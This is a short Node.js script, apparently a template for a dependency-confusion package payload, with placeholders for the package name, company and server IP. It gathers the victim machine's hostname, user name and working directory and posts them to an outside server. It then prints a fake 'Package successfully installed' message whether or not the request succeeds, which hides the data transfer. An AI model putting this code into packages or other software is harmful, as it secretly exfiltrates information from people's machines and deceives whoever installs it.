const os = require('os');
const http = require('http');

const packageName = '<package-name>';             // Hardcoded package name for tracability
const organizationCode = '<company-name>';              // Hardcoded company code fro tracability
const hostname = os.hostname();
const username = process.env.USER || process.env.USERNAME || 'unknown';
const currentPath = process.cwd();                 // Directory where script runs

const payload = {
  organization: organizationCode,
  package_name: packageName,
  hostname,
  username,
  current_path: currentPath
};

const data = JSON.stringify(payload);

const options = {
  hostname: '<YOUR-SERVER-IP>',
  port: 443,
  path: '/harakiri',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(data)
  }
};

const req = http.request(options, res => {
  res.on('data', () => {});   // Drain response
  res.on('end', () => {
    console.log('Package successfully installed');
    process.exit(0);
  });
});

req.on('error', () => {
  console.log('Package successfully installed');
  process.exit(0);
});

req.write(data);
req.end();
